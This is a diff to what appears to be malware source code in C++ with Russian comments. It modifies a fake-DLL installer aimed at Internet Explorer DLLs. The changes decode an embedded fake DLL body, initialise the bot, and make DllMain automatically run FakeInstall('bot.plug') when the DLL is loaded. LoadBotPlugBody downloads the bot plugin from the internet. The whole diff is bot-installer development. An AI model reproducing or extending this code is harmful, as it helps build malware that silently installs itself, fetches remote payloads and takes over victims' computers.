@@ -395,14 +395,19 @@ bool SelectTargetIeDll(
 LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 {
 	//return File::ReadToBufferA("fake.dll", Size);
-	return GetSectionData("FakeDllBody", &Size);
+	LPVOID buf;
+	bool bufAlloc;
+	if( TMemoryDLL::DecodeDll( fakeDllData, Size, buf, bufAlloc ) )
+		return buf;
+	else
+		return 0;
 }
 
 // Качает тело Bot.plug с инета.
 // Выделена отдельно, потому что возможно будем встраивать Bot.plug прямо в инсталер.
 LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
 {
-	//return File::ReadToBufferA("bot.plug", Size);
+//	return File::ReadToBufferA("bot.plug", Size);
 
 	string PlugName = BotPlugName;
 	STR::AnsiLowerCase(PlugName.t_str());
@@ -410,7 +415,6 @@ LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
 	// Качаем плагин бота с вшитыми параметрами для запуска
 	LPBYTE Plug = Plugin::DownloadEx(PlugName.t_str(), NULL, &Size, true, false, NULL);
 	FAKEDLLDBG("LoadBotPlugBody", "DownloadEx result module=0x%X size=%u", Plug, Size);
-
 	return Plug;
 }
 
@@ -615,6 +619,7 @@ BOOL WINAPI FakeInstall(
 	const void* InstallerBody, 
 	DWORD InstallerBodySize)
 {
+	BOT::Initialize();
 	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
 
@@ -629,7 +634,16 @@ BOOL WINAPI FakeInstall(
 
 DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 {
-	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);
-
+//	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);
+	switch (reason)
+	{
+		case DLL_PROCESS_ATTACH:
+			FakeInstall( "bot.plug", 0, 0, 0 );
+			break;
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
+	}
 	return TRUE;
 }
